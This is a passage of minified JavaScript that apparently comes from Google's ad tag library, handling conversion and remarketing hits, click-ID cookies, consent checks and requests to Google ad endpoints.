      pu = function (a) {
        if (
          Tt(a, ["conversion", "remarketing"]) &&
          G.__gsaExp &&
          G.__gsaExp.id
        ) {
          var b = G.__gsaExp.id;
          if (pb(b))
            try {
              var c = Number(b());
              isNaN(c) || (a.o[P.g.Bg] = c);
            } catch (d) {}
        }
      },
      qu = function (a) {
        if (Tt(a, ["conversion", "remarketing"])) {
          var b = hr();
          void 0 !== b && (a.o[P.g.ie] = b || "error");
          var c = Dn();
          c && (a.o[P.g.Ac] = c);
          var d = Cn();
          d && (a.o[P.g.Dc] = d);
        }
      },
      ru = function (a) {
        Tt(a, ["conversion"]) && "1" === Yo(!1)._up && (a.o[P.g.ae] = !0);
      },
      su = function (a) {
        Tt(a, ["conversion"]) &&
          (a.metadata.redact_click_ids =
            !!a.metadata.redact_ads_data && !W(Qt()));
      },
      tu = function (a) {
        if (
          Tt(a, ["conversion", "user_data_lead", "user_data_web"]) &&
          W(P.g.R) &&
          a.metadata.conversion_linker_enabled
        ) {
          var b = a.metadata.cookie_options,
            c = Vp(b.prefix);
          "_gcl" === c && (c = "");
          var d = (function ar(a) {
            var c,
              d,
              b = { th: void 0, uh: void 0 };
            if (
              (Vq.test(H.location.host) &&
                ((c = $q("gclgs")), (d = $q("gclst"))),
              c && d)
            )
              (b.th = c), (b.uh = d);
            else {
              var e = Cb(),
                f = Xp((a || "_gcl") + "_gs"),
                g = f.map(function (m) {
                  return m.aa;
                }),
                k = f.map(function (m) {
                  return e - m.timestamp;
                });
              g.length > 0 &&
                k.length > 0 &&
                ((b.th = g.join(".")), (b.uh = k.join(".")));
            }
            return b;
          })(c);
          (a.o[P.g.Ai] = d.th), (a.o[P.g.Bi] = d.uh);
          var e = U(65);
          if (fr(c, e)) {
            var f = e
              ? (function er(a) {
                  return br(a, "braids", "gclgb")
                    .map(function (b) {
                      return b.aa;
                    })
                    .join(".");
                })(c)
              : (function dr(a) {
                  return br(a, "wbraid", "gclgb")
                    .map(function (b) {
                      return b.aa;
                    })
                    .join(".");
                })(c);
            if ((f && (a.o[P.g.nb] = f), !c)) {
              var g = a.o[P.g.qb];
              (b = h(b)).prefix = c;
              var k = Zq(g, b, !0).Kl;
              k && (a.o[P.g.zc] = k);
            }
          } else {
            var m = (function cr(a) {
              return br(a, "gclid", "gclaw")
                .map(function (b) {
                  return b.aa;
                })
                .join(".");
            })(c);
            if ((m && (a.o[P.g.Va] = m), !c)) {
              var n = Yq(Pp(["ad_storage", "ad_user_data"]) ? wp() : {}, Wq);
              n && (a.o[P.g.Yd] = n);
            }
          }
        }
      },
      uu = function (a) {
        if (
          Tt(a, [
            "conversion",
            "remarketing",
            "user_data_lead",
            "user_data_web",
          ]) &&
          a.metadata.conversion_linker_enabled &&
          W(P.g.R)
        ) {
          var b = !U(3);
          if ("remarketing" !== a.metadata.hit_type || b) {
            var c = a.metadata.cookie_options;
            lp(
              c,
              "conversion" === a.metadata.hit_type && a.eventName !== P.g.Ua
            ),
              W(P.g.O) && (a.o[P.g.Gb] = jp[mp(c.prefix)]);
          }
        }
      },
      vu = function (a) {
        zi.D ||
          oi ||
          (function ej(a) {
            for (
              var b = ma([P.g.jd, P.g.Nb]), c = b.next();
              !c.done;
              c = b.next()
            ) {
              var d = Q(a, c.value);
              if (d) return d;
            }
          })(a.m) ||
          (U(81) && pt(void 0, Math.round(Cb())));
      },
      wu = function () {},
      xu = function (a) {
        if (Tt(a, ["conversion"])) {
          var b = Tr(a.metadata.cookie_options);
          if (b && !a.o[P.g.Aa]) {
            var c = Fo(a.o[P.g.qb]);
            a.o[P.g.Aa] = c;
          }
          b && ((a.o[P.g.wb] = b), (a.metadata.send_ccm_parallel_ping = !0));
        }
      },
      yu = function (a) {
        var b = W(Qt());
        switch (a.metadata.hit_type) {
          case "user_data_lead":
          case "user_data_web":
            a.isAborted = !b || !!a.metadata.consent_updated;
            break;
          case "remarketing":
            a.isAborted = !b;
            break;
          case "conversion":
            a.metadata.consent_updated && (a.o[P.g.Sb] = !0);
        }
      },
      zu = function (a) {
        Tt(a, ["conversion"]) &&
          a.m.eventMetadata.is_external_event &&
          (a.o[P.g.oj] = !0);
      },
      Au = function (a) {
        !a.metadata.consent_updated &&
          U(24) &&
          Tt(a, ["conversion"]) &&
          Rq(Sq()) &&
          ((a.o[P.g.ed] = "1"), (a.metadata.add_tag_timing = !0));
      },
      Bu = function (a) {
        var b;
        if ("gtag.config" !== a.eventName && a.metadata.send_user_data_hit)
          switch (a.metadata.hit_type) {
            case "user_data_web":
              (b = 97), St(a);
              break;
            case "user_data_lead":
              (b = 98), St(a);
              break;
            case "conversion":
              b = 99;
          }
        !a.metadata.speculative && b && O(b),
          !0 === a.metadata.speculative && (a.isAborted = !0);
      },
      Cu = function (a) {
        U(18) &&
        a.eventName === P.g.ba &&
        Tt(a, "page_view") &&
        !a.metadata.consent_updated &&
        !a.m.isGtmEvent
          ? Nr(a.target, a.m)
          : Tt(a, "call_conversion") && (Nr(a.target, a.m), (a.isAborted = !0));
      },
      Fu = function (a) {
        !(function (a, b) {
          var c = {},
            d = function (f, g) {
              var k;
              (k =
                !0 === g
                  ? "1"
                  : !1 === g
                  ? "0"
                  : encodeURIComponent(String(g))),
                (c[f] = k);
            };
          if (
            (z(a.o, function (f, g) {
              var k = Du[f];
              k &&
                void 0 !== g &&
                "" !== g &&
                (!a.metadata.redact_click_ids ||
                  (f !== P.g.Hd &&
                    f !== P.g.Pd &&
                    f !== P.g.bf &&
                    f !== P.g.ig) ||
                  (g = "0"),
                d(k, g));
            }),
            d("gtm", co({ xa: a.metadata.source_canonical_id })),
            Kn() && d("gcs", Ln()),
            d("gcd", Pn(a.m)),
            Yn() && d("dma_cps", Qn()),
            d("dma", Rn()),
            on(wn()) && d("tcfd", Zn()),
            zi.j && d("tag_exp", zi.j),
            a.metadata.add_tag_timing)
          ) {
            d("tft", Cb());
            var e = Qc();
            void 0 !== e && d("tfd", Math.round(e));
          }
          U(17) && d("apve", U(18) ? "1" : "0"),
            U(19) && d("apvf", Nc() ? (U(20) ? "f" : "sb") : "nf"),
            b(c);
        })(a, function (b) {
          if ("page_view" === a.metadata.hit_type) {
            var c = [];
            z(b, function (e, f) {
              c.push(e + "=" + f);
            });
            var d =
              fj(
                W([P.g.R, P.g.O])
                  ? "https://www.google.com"
                  : "https://pagead2.googlesyndication.com",
                !0
              ) +
              "/ccm/collect?" +
              c.join("&");
            U(19) && U(20) && Nc() ? Oc(d, void 0, { noFallback: !0 }) : Kc(d),
              pb(a.m.onSuccess) && a.m.onSuccess();
          }
        });
      },
      Gu = {},
      Du =
        ((Gu[P.g.Sb] = "gcu"),
        (Gu[P.g.nb] = "gclgb"),
        (Gu[P.g.Va] = "gclaw"),
        (Gu[P.g.Ci] = "gad_source"),
        (Gu[P.g.Di] = "gad_source_src"),
        (Gu[P.g.Hd] = "gclid"),
        (Gu[P.g.Ei] = "gclsrc"),
        (Gu[P.g.ig] = "gbraid"),
        (Gu[P.g.bf] = "wbraid"),
        (Gu[P.g.Gb] = "auid"),
        (Gu[P.g.Gi] = "rnd"),
        (Gu[P.g.Ji] = "ncl"),
        (Gu[P.g.lg] = "gcldc"),
        (Gu[P.g.Pd] = "dclid"),
        (Gu[P.g.rb] = "edid"),
        (Gu[P.g.xc] = "en"),
        (Gu[P.g.Ac] = "gdpr"),
        (Gu[P.g.ub] = "gdid"),
        (Gu[P.g.Bc] = "_ng"),
        (Gu[P.g.Wi] = "gtm_up"),
        (Gu[P.g.Jb] = "frm"),
        (Gu[P.g.ed] = "lps"),
        (Gu[P.g.be] = "did"),
        (Gu[P.g.wa] = "dl"),
        (Gu[P.g.Da] = "dr"),
        (Gu[P.g.cb] = "dt"),
        (Gu[P.g.uf] = "ga_uid"),
        (Gu[P.g.Dc] = "gdpr_consent"),
        (Gu[P.g.Ba] = "uid"),
        (Gu[P.g.ie] = "us_privacy"),
        (Gu[P.g.Ob] = "npa"),
        Gu),
      Hu = {
        M: {
          di: "ads_conversion_hit",
          Fd: "container_execute_start",
          gi: "container_setup_end",
          Yf: "container_setup_start",
          ei: "container_blocking_end",
          fi: "container_execute_end",
          hi: "container_yield_end",
          Zf: "container_yield_start",
          gj: "event_execute_end",
          fj: "event_evaluation_end",
          Rg: "event_evaluation_start",
          ij: "event_setup_end",
          je: "event_setup_start",
          kj: "ga4_conversion_hit",
          pe: "page_load",
          Cn: "pageview",
          hc: "snippet_load",
          Fj: "tag_callback_error",
          Gj: "tag_callback_failure",
          Hj: "tag_callback_success",
          Ij: "tag_execute_end",
          od: "tag_execute_start",
        },
      };
    function Iu() {
      function a(c, d) {
        var e = jb(d);
        e && b.push([c, e]);
      }
      var b = [];
      return a("u", "GTM"), a("ut", "TAGGING"), a("h", "HEALTH"), b;
    }
    var Bv = function (a, b, c) {
        var d = $m(a, "fmt");
        if (b) {
          var e = $m(a, "random"),
            f = $m(a, "label") || "";
          if (!e) return !1;
          var g = (function (a) {
            for (var b = [], c = 0, d = 0; d < a.length; d++) {
              var e = a.charCodeAt(d);
              e > 255 && ((b[c++] = 255 & e), (e >>= 8)), (b[c++] = e);
            }
            var f = 4;
            if ((void 0 === f && (f = 0), !xt)) {
              xt = {};
              for (
                var g =
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(
                      ""
                    ),
                  k = ["+/=", "+/", "-_=", "-_.", "-_"],
                  m = 0;
                m < 5;
                m++
              ) {
                var n = g.concat(k[m].split(""));
                wt[m] = n;
                for (var p = 0; p < n.length; p++) {
                  var q = n[p];
                  void 0 === xt[q] && (xt[q] = p);
                }
              }
            }
            for (
              var r = wt[f],
                t = Array(Math.floor(b.length / 3)),
                u = r[64] || "",
                v = 0,
                w = 0;
              v < b.length - 2;
              v += 3
            ) {
              var x = b[v],
                y = b[v + 1],
                B = b[v + 2],
                A = r[x >> 2],
                C = r[((3 & x) << 4) | (y >> 4)],
                E = r[((15 & y) << 2) | (B >> 6)],
                D = r[63 & B];
              t[w++] = "" + A + C + E + D;
            }
            var F = 0,
              L = u;
            switch (b.length - v) {
              case 2:
                L = r[(15 & (F = b[v + 1])) << 2] || u;
              case 1:
                var M = b[v];
                t[w] = "" + r[M >> 2] + r[((3 & M) << 4) | (F >> 4)] + L + u;
            }
            return t.join("");
          })(
            decodeURIComponent(f.replace(/\+/g, " ")) +
              ":" +
              decodeURIComponent(e.replace(/\+/g, " "))
          );
          if (
            !(function Av(a, b) {
              var d,
                c = G,
                e = c.GooglebQhCsO;
              return (
                e || ((e = {}), (c.GooglebQhCsO = e)),
                !(d = e)[a] && ((d[a] = []), (d[a][0] = b), !0)
              );
            })(g, b)
          )
            return !1;
        }
        d && 4 != d && (a = bn(a, "rfmt", d));
        var k = bn(a, "fmt", 4);
        return (
          Ac(
            k,
            function () {
              G.google_noFurtherRedirects &&
                b &&
                b.call &&
                ((G.google_noFurtherRedirects = null), b());
            },
            void 0,
            c,
            H.getElementsByTagName("script")[0].parentElement || void 0
          ),
          !0
        );
      },
      Dv = function (a) {
        null != a.item_id &&
          (null != a.id ? (O(138), a.id !== a.item_id && O(148)) : O(153));
        var b = a.id;
        return (
          U(16) &&
            (null != a.item_id
              ? (b = a.item_id)
              : null == b && (b = a.item_name)),
          b
        );
      },
      Gv = function (a) {
        return "number" != typeof a && "string" != typeof a ? "" : a.toString();
      },
      Jv = function (a, b) {
        var c = Iv(b);
        return a + (a && c ? ";" : "") + c;
      },
      Iv = function (a) {
        if (!a || "object" != typeof a || "function" == typeof a.join)
          return "";
        var b = [];
        return (
          z(a, function (c, d) {
            var e, f;
            if (Array.isArray(d)) {
              for (var g = [], k = 0; k < d.length; ++k) {
                var m = Kv(d[k]);
                null != m && g.push(m);
              }
              f = 0 !== g.length ? g.join(",") : void 0;
            } else f = Kv(d);
            e = f;
            var n = Kv(c);
            n && null != e && b.push(n + "=" + e);
          }),
          b.join(";")
        );
      },
      Kv = function (a) {
        var b = typeof a;
        if (null != a && "object" !== b && "function" !== b)
          return String(a)
            .replace(/,/g, "\\,")
            .replace(/;/g, "\\;")
            .replace(/=/g, "\\=");
      },
      Lv = function (a, b) {
        var c = [],
          d = function (f, g) {
            var k = !0 === cg[f];
            null == g ||
              (!k && "" === g) ||
              (!0 === g && (g = 1),
              !1 === g && (g = 0),
              c.push(f + "=" + encodeURIComponent(g)));
          },
          e = a.metadata.hit_type;
        return (
          ("conversion" !== e && "remarketing" !== e) ||
            d("random", a.metadata.event_start_timestamp_ms),
          z(b, d),
          c.join("&")
        );
      },
      Mv = function (a, b) {
        var g,
          m,
          c = a.metadata.hit_type,
          d = a.o[P.g.Vc],
          e = W([P.g.R, P.g.O]),
          f = [],
          k = a.m.onSuccess,
          p = 0,
          q = function (y) {
            f.push(y), y.Ha && p++;
          };
        switch (c) {
          case "conversion":
            m = "/pagead/conversion";
            var r = "",
              t = void 0;
            e
              ? a.metadata.is_gcp_conversion
                ? ((g = "https://www.google.com"),
                  (m = "/pagead/1p-conversion"),
                  (t = 8))
                : ((g = "https://www.googleadservices.com"), (t = 5))
              : ((g = "https://pagead2.googlesyndication.com"), (t = 6)),
              a.metadata.is_gcp_conversion &&
                (r = "&gcp=1&sscte=1&ct_cookie_present=1");
            var u = {
              Ka: "" + fj(g, !0) + m + "/" + d + "/?" + Lv(a, b) + r,
              format: 3,
              Ha: !0,
              endpoint: t,
            };
            W(P.g.O) && (u.attributes = { attributionsrc: "" }),
              q(u),
              a.metadata.send_ccm_parallel_ping &&
                ((t = a.metadata.is_gcp_conversion ? 23 : 22),
                q({
                  Ka: fj(g, !0) + "/ccm/conversion/" + d + "/?" + Lv(a, b) + r,
                  format: 2,
                  Ha: !0,
                  endpoint: t,
                })),
              a.metadata.is_gcp_conversion &&
                e &&
                ((r = "&gcp=1&ct_cookie_present=1"),
                q({
                  Ka:
                    fj("https://googleads.g.doubleclick.net") +
                    "/pagead/viewthroughconversion/" +
                    d +
                    "/?" +
                    Lv(a, b) +
                    r,
                  format: 3,
                  Ha: !0,
                  endpoint: 9,
                }));
            break;
          case "remarketing":
            var v = b.data || "",
              w = (function (a) {
                for (var b = {}, c = 0; c < a.length; c++) {
                  var d = a[c],
                    e = void 0;
                  if (d.hasOwnProperty("google_business_vertical")) {
                    e = d.google_business_vertical;
                    var f = {};
                    b[e] = b[e] || ((f.google_business_vertical = e), f);
                  } else (e = ""), b.hasOwnProperty(e) || (b[e] = {});
                  var k,
                    g = b[e];
                  for (k in d)
                    "google_business_vertical" !== k &&
                      (k in g || (g[k] = []), g[k].push(d[k]));
                }
                return Object.keys(b).map(function (m) {
                  return b[m];
                });
              })(
                (function (a) {
                  if (!a || !a.length) return [];
                  for (var b = [], c = 0; c < a.length; ++c) {
                    var d = a[c];
                    if (d) {
                      var e = {};
                      b.push(
                        ((e.id = Dv(d)),
                        (e.origin = d.origin),
                        (e.destination = d.destination),
                        (e.start_date = d.start_date),
                        (e.end_date = d.end_date),
                        (e.location_id = d.location_id),
                        (e.google_business_vertical =
                          d.google_business_vertical),
                        e)
                      );
                    }
                  }
                  return b;
                })(a.o[P.g.da])
              );
            if (w.length) {
              for (var x = 0; x < w.length; x++)
                (b.data = Jv(v, w[x])),
                  q({
                    Ka:
                      fj("https://googleads.g.doubleclick.net") +
                      "/pagead/viewthroughconversion/" +
                      d +
                      "/?" +
                      Lv(a, b),
                    format: 3,
                    Ha: !0,
                    endpoint: 9,
                  }),
                  a.metadata.send_fledge_experiment &&
                    q({
                      Ka:
                        "https://td.doubleclick.net/td/rul/" +
                        d +
                        "?" +
                        Lv(a, b),
                      format: 4,
                      Ha: !1,
                      endpoint: 44,
                    }),
                  (a.metadata.event_start_timestamp_ms += 1);
              a.metadata.send_fledge_experiment = !1;
            } else
              q({
                Ka:
                  fj("https://googleads.g.doubleclick.net") +
                  "/pagead/viewthroughconversion/" +
                  d +
                  "/?" +
                  Lv(a, b),
                format: 3,
                Ha: !0,
                endpoint: 9,
              });
            break;
          case "user_data_lead":
            q({
              Ka:
                fj("https://google.com") +
                "/pagead/form-data/" +
                d +
                "?" +
                Lv(a, b),
              format: 1,
              Ha: !0,
              endpoint: 11,
            });
            break;
          case "user_data_web":
            q({
              Ka:
                fj("https://google.com") +
                "/ccm/form-data/" +
                d +
                "?" +
                Lv(a, b),
              format: 1,
              Ha: !0,
              endpoint: 21,
            });
        }
        return (
          f.length > 1 &&
            pb(a.m.onSuccess) &&
            (k = (function Nb(a, b) {
              function c() {
                e && ++d === b && (e(), (e = null), (c.done = !0));
              }
              var d = 0,
                e = a;
              return (c.done = !1), c;
            })(a.m.onSuccess, p)),
          ("conversion" !== c && "remarketing" !== c) ||
            !a.metadata.send_fledge_experiment ||
            (U(27) && "conversion" === c && (b.ct_cookie_present = 0),
            q({
              Ka: "https://td.doubleclick.net/td/rul/" + d + "?" + Lv(a, b),
              format: 4,
              Ha: !1,
              endpoint: 44,
            })),
          { onSuccess: k, dm: f }
        );
      },
      Nv = function (a, b, c, d, e, f, g) {
        c.m.eventId, c.eventName;
        var k = function () {
          f && f();
        };
        switch (b) {
          case 1:
            Kc(a), f && f();
            break;
          case 2:
            Dc(a, k, void 0, g);
            break;
          case 3:
            var m = !1;
            try {
              m = Bv(a, k, g);
            } catch (q) {
              m = !1;
            }
            m || Nv(a, 2, c, d, e, k, g);
            break;
          case 4:
            var n = "AW-" + c.o[P.g.Vc],
              p = c.o[P.g.qb];
            p && (n = n + "/" + p),
              (function Nt(a, b) {
                var g,
                  c = void 0 === mb[3] ? 1 : mb[3],
                  d = 'iframe[data-tagging-id="' + b + '"]',
                  e = [];
                try {
                  if (1 === c) {
                    var f = H.querySelector(d);
                    f && (e = [f]);
                  } else e = Array.from(H.querySelectorAll(d));
                } catch (q) {}
                a: {
                  try {
                    g = H.querySelectorAll(
                      'iframe[allow="join-ad-interest-group"][data-tagging-id*="-"]'
                    );
                    break a;
                  } catch (q) {}
                  g = void 0;
                }
                var n,
                  k = g,
                  m =
                    ((null == k ? void 0 : k.length) || 0) >=
                    (void 0 === mb[2] ? 50 : mb[2]);
                if ((n = e.length >= 1)) {
                  var p = Number(e[e.length - 1].dataset.loadTime);
                  void 0 !== p && Cb() - p < (void 0 === mb[1] ? 6e4 : mb[1])
                    ? (ib("TAGGING", 9), (n = !0))
                    : (n = !1);
                }
                if (!n) {
                  if (1 === c) {
                    if (e.length >= 1) Ot(e[0]);
                    else if (m) return void ib("TAGGING", 10);
                  } else e.length >= c ? Ot(e[0]) : m && Ot(k[0]);
                  Cc(
                    a,
                    void 0,
                    { allow: "join-ad-interest-group" },
                    { taggingId: b, loadTime: Cb() }
                  );
                }
              })(a, n);
        }
      },
      Pv = {},
      Qv =
        ((Pv[P.g.Sb] = "gcu"),
        (Pv[P.g.nb] = "gclgb"),
        (Pv[P.g.Va] = "gclaw"),
        (Pv[P.g.Ai] = "gclgs"),
        (Pv[P.g.Bi] = "gclst"),
        (Pv[P.g.Gb] = "auid"),
        (Pv[P.g.Kd] = "dscnt"),
        (Pv[P.g.Ld] = "fcntr"),
        (Pv[P.g.Md] = "flng"),
        (Pv[P.g.Nd] = "mid"),
        (Pv[P.g.jg] = "bttype"),
        (Pv[P.g.qb] = "label"),
        (Pv[P.g.Wb] = "capi"),
        (Pv[P.g.ff] = "pscdl"),
        (Pv[P.g.za] = "currency_code"),
        (Pv[P.g.Od] = "vdltv"),
        (Pv[P.g.Ki] = "_dbg"),
        (Pv[P.g.Ud] = "oedeld"),
        (Pv[P.g.rb] = "edid"),
        (Pv[P.g.Pi] = "fdr"),
        (Pv[P.g.qg] = "fledge"),
        (Pv[P.g.Yd] = "gac"),
        (Pv[P.g.zc] = "gacgb"),
        (Pv[P.g.wg] = "gacmcov"),
        (Pv[P.g.Ac] = "gdpr"),
        (Pv[P.g.ub] = "gdid"),
        (Pv[P.g.Bc] = "_ng"),
        (Pv[P.g.Bg] = "gsaexp"),
        (Pv[P.g.Jb] = "frm"),
        (Pv[P.g.ae] = "gtm_up"),
        (Pv[P.g.ed] = "lps"),
        (Pv[P.g.be] = "did"),
        (Pv[P.g.fd] = void 0),
        (Pv[P.g.cb] = "tiba"),
        (Pv[P.g.Zb] = "rdp"),
        (Pv[P.g.wb] = "ecsid"),
        (Pv[P.g.uf] = "ga_uid"),
        (Pv[P.g.ld] = "delopc"),
        (Pv[P.g.Dc] = "gdpr_consent"),
        (Pv[P.g.Aa] = "oid"),
        (Pv[P.g.xf] = "uaa"),
        (Pv[P.g.yf] = "uab"),
        (Pv[P.g.zf] = "uafvl"),
        (Pv[P.g.Af] = "uamb"),
        (Pv[P.g.Bf] = "uam"),
        (Pv[P.g.Cf] = "uap"),
        (Pv[P.g.Df] = "uapv"),
        (Pv[P.g.Ef] = "uaw"),
        (Pv[P.g.Lg] = "ec_lat"),
        (Pv[P.g.Mg] = "ec_meta"),
        (Pv[P.g.Ng] = "ec_m"),
        (Pv[P.g.Og] = "ec_sel"),
        (Pv[P.g.Pg] = "ec_s"),
        (Pv[P.g.md] = "ec_mode"),
        (Pv[P.g.Ba] = "userId"),
        (Pv[P.g.ie] = "us_privacy"),
        (Pv[P.g.na] = "value"),
        (Pv[P.g.Qg] = "mcov"),
        (Pv[P.g.nj] = "hn"),
        (Pv[P.g.oj] = "gtm_ee"),
        (Pv[P.g.Ob] = "npa"),
        (Pv[P.g.Vc] = null),
        (Pv[P.g.Mb] = null),
        (Pv[P.g.Qa] = null),
        (Pv[P.g.da] = null),
        (Pv[P.g.wa] = null),
        (Pv[P.g.Da] = null),
        (Pv[P.g.vf] = null),
        (Pv[P.g.me] = null),
        Pv),
      Sv = function (a) {
        "page_view" === a.metadata.hit_type
          ? Fu(a)
          : Rv(a, function (b, c) {
              for (
                var d = Mv(a, b), e = d.onSuccess, f = d.dm, g = {}, k = 0;
                k < f.length;
                g = {
                  Ka: void 0,
                  sh: void 0,
                  mh: void 0,
                  Ha: void 0,
                  Zg: void 0,
                },
                  k++
              ) {
                var m = f[k];
                (g.Ka = m.Ka),
                  (g.sh = m.format),
                  (g.Ha = m.Ha),
                  (g.Zg = m.attributes),
                  (g.mh = m.endpoint);
                var n;
                if (null != (n = c) && n.Ym) {
                  var p = (function (u) {
                      return function (v) {
                        Kh(c.zm, function (w) {
                          var x = Ah(w),
                            y = u.Ka;
                          if (v) {
                            var B = co({
                              xa: a.metadata.source_canonical_id,
                              lk: v,
                            });
                            y = y.replace(b.gtm, B);
                          }
                          Nv(
                            y + "&em=" + encodeURIComponent(x.Zj),
                            u.sh,
                            a,
                            b,
                            u.mh,
                            u.Ha ? e : void 0,
                            u.Zg
                          );
                        });
                      };
                    })(g),
                    q = c,
                    r = q.Yh;
                  rt(
                    "" + g.Ka + q.gn.join(""),
                    r,
                    g.Ha && e ? e : function () {},
                    p
                  );
                } else Nv(g.Ka, g.sh, a, b, g.mh, g.Ha ? e : void 0, g.Zg);
              }
            });
      },
      Rv = function (a, b) {
        var f,
          c = a.metadata.hit_type,
          d = {},
          e = {},
          g = [],
          k = a.metadata.event_start_timestamp_ms;
        ("conversion" !== c && "remarketing" !== c) ||
          ((d.cv = "11"),
          (d.fst = k),
          (d.fmt = 3),
          (d.bg = "ffffff"),
          (d.guid = "ON"),
          (d.async = "1"));
        var m = sq(["aw", "dc"]);
        if (
          (null != m && (d.gad_source = m),
          (d.gtm = co({ xa: a.metadata.source_canonical_id })),
          "remarketing" !== c && Kn() && (d.gcs = Ln()),
          (d.gcd = Pn(a.m)),
          Yn() && (d.dma_cps = Qn()),
          (d.dma = Rn()),
          on(wn()) && (d.tcfd = Zn()),
          zi.j && (d.tag_exp = zi.j),
          a.o[P.g.Mb])
        ) {
          var n = a.o[P.g.Mb].split("x");
          2 === n.length && ((d.u_w = n[0]), (d.u_h = n[1]));
        }
        if (a.o[P.g.Qa]) {
          var p = a.o[P.g.Qa];
          2 === p.length
            ? (d.hl = p)
            : 5 === p.length &&
              ((d.hl = p.substring(0, 2)), (d.gl = p.substring(3, 5)));
        }
        var q = a.metadata.redact_click_ids,
          r = function (F, L) {
            var M = a.o[L];
            M &&
              (d[F] = q
                ? (function Zi(a) {
                    function b(n) {
                      var p = n.split("=")[0];
                      return d.indexOf(p) < 0 ? n : p + "=0";
                    }
                    function c(n) {
                      return n
                        .split("&")
                        .map(b)
                        .filter(function (p) {
                          return void 0 !== p;
                        })
                        .join("&");
                    }
                    var d =
                        "gclid dclid gbraid wbraid gclaw gcldc gclha gclgf gclgb _gl".split(
                          " "
                        ),
                      e = Yi(a),
                      f = a.split(/[?#]/)[0],
                      g = e.search,
                      k = e.hash;
                    "?" === g[0] && (g = g.substring(1)),
                      "#" === k[0] && (k = k.substring(1)),
                      "" !== (g = c(g)) && (g = "?" + g),
                      "" !== (k = c(k)) && (k = "#" + k);
                    var m = "" + f + g + k;
                    return (
                      "/" === m[m.length - 1] &&
                        (m = m.substring(0, m.length - 1)),
                      m
                    );
                  })(M)
                : M);
          };
        r("url", P.g.wa),
          r("ref", P.g.Da),
          r("top", P.g.vf),
          z(a.o, function (F, L) {
            if (Qv.hasOwnProperty(F)) {
              var M = Qv[F];
              M && (d[M] = L);
            } else e[F] = L;
          }),
          (function ml(a, b) {
            U(12) &&
              b &&
              z(b, function (c, d) {
                "object" != typeof d && (a["1p." + c] = String(d));
              });
          })(d, a.o[P.g.me]);
        var t = a.o[P.g.fd];
        null != t && "" !== t && (d.vdnc = String(t));
        var u = a.o[P.g.Zc];
        void 0 !== u && (d.shf = u);
        var v = a.o[P.g.wc];
        if (
          (void 0 !== v && (d.delc = v), U(24) && a.metadata.add_tag_timing)
        ) {
          d.tft = Cb();
          var w = Qc();
          void 0 !== w && (d.tfd = Math.round(w));
        }
        d.data = Iv(e);
        var x = a.o[P.g.da];
        if (
          (x &&
            "conversion" === c &&
            ((d.iedeld = (function (a) {
              if (a && a.length) {
                for (var b = [], c = 0; c < a.length; ++c) {
                  var d = a[c];
                  d && d.estimated_delivery_date
                    ? b.push("" + d.estimated_delivery_date)
                    : b.push("");
                }
                return b.join(",");
              }
            })(x)),
            (d.item = (function (a) {
              if (!a) return "";
              for (var b = [], c = 0; c < a.length; c++) {
                var d = a[c],
                  e = [];
                d &&
                  (e.push(Gv(d.value)),
                  e.push(Gv(d.quantity)),
                  e.push(Gv(d.item_id)),
                  e.push(Gv(d.start_date)),
                  e.push(Gv(d.end_date)),
                  b.push("(" + e.join("*") + ")"));
              }
              return b.length > 0 ? b.join("") : "";
            })(
              (function (a) {
                if (!a || !a.length) return [];
                for (var b = [], c = 0; c < a.length; ++c) {
                  var d = a[c];
                  d &&
                    b.push({
                      item_id: Dv(d),
                      quantity: d.quantity,
                      value: d.price,
                      start_date: d.start_date,
                      end_date: d.end_date,
                    });
                }
                return b;
              })(x)
            ))),
          ("conversion" === c ||
            "user_data_lead" === c ||
            "user_data_web" === c) &&
            a.metadata.user_data)
        )
          if (!W(P.g.O) || (U(15) && !W(P.g.R))) d.ec_mode = void 0;
          else {
            var y = function () {
              if ("user_data_web" === c) {
                var F,
                  M,
                  L = a.metadata.cookie_options;
                if (((L = L || {}), W(Sr))) {
                  (M = Tr(L)) || (M = Fo());
                  var R = L,
                    V = mp(R.prefix);
                  op(R, M),
                    delete jp[V],
                    delete kp[V],
                    np(V, R.path, R.domain),
                    (F = Tr(L));
                } else F = void 0;
                d.ecsid = F;
              }
            };
            if ("conversion" !== c && U(81)) {
              d.gtm = co({ xa: a.metadata.source_canonical_id, lk: 3 });
              var B = Jh(a.metadata.user_data),
                A = (function (a) {
                  for (
                    var b = {}, c = ["tv.1"], d = 0, e = ma(a), f = e.next();
                    !f.done;
                    f = e.next()
                  ) {
                    var g = f.value;
                    if ("" !== g.value) {
                      var k,
                        m = void 0,
                        n = g.name,
                        p = g.value,
                        q = uh[n];
                      if (q) {
                        var r = null != (m = g.index) ? m : "",
                          t = q + "__" + d;
                        -1 === vh.indexOf(n) ||
                        /^e\d+$/.test(p) ||
                        wh.test(p) ||
                        rh.test(p)
                          ? (k = encodeURIComponent(encodeURIComponent(p)))
                          : ((k = "${userData." + t + "|sha256}"),
                            (b[t] = p),
                            d++),
                          c.push("" + q + r + "." + k);
                      }
                    }
                  }
                  return { Yh: { userData: b }, fn: c.join("~"), on: d };
                })(B),
                C = A.on;
              (f = { Ym: !0, Yh: A.Yh, gn: ["&em=" + A.fn], zm: B }),
                C > 0 && y();
            } else {
              var E = (function (a) {
                if (G.Promise)
                  try {
                    return new Promise(function (b) {
                      yh(a, function (c, d) {
                        b({ Yj: c, Ue: d });
                      });
                    });
                  } catch (b) {}
              })(a.metadata.user_data);
              if (E) {
                var D = E.then(function (F) {
                  return (
                    (d.em = F.Yj),
                    F.Ue > 0 && y(),
                    U(70) &&
                      (function (a) {
                        switch (a) {
                          case "conversion":
                            return U(50);
                          case "user_data_lead":
                            return U(51);
                          case "user_data_web":
                            return U(52);
                        }
                        return !1;
                      })(c) &&
                      ((d._is_ee = 0),
                      (d._es = 13),
                      0 === F.Ue && (d._es = 12)),
                    F
                  );
                });
                g.push(D);
              }
            }
          }
        if (g.length)
          try {
            return void Promise.all(g).then(function () {
              b(d);
            });
          } catch (F) {}
        b(d, f);
      };
    function Tv(a, b) {
      if (data.entities) {
        var c = data.entities[a];
        if (c) return c[b];
      }
    }
    function Uv(a, b, c) {
      (c = void 0 !== c && c), Vv().addRestriction(0, a, b, c);
    }
    var Yv = function () {
        (this.j = {}), (this.D = {});
      },
      Zv = function (a, b) {
        var c = a.j[b];
        return (
          c ||
            ((c = {
              _entity: { internal: [], external: [] },
              _event: { internal: [], external: [] },
            }),
            (a.j[b] = c)),
          c
        );
      };
    function Vv() {
      var a = hi.r;
      return a || ((a = new Yv()), (hi.r = a)), a;
    }
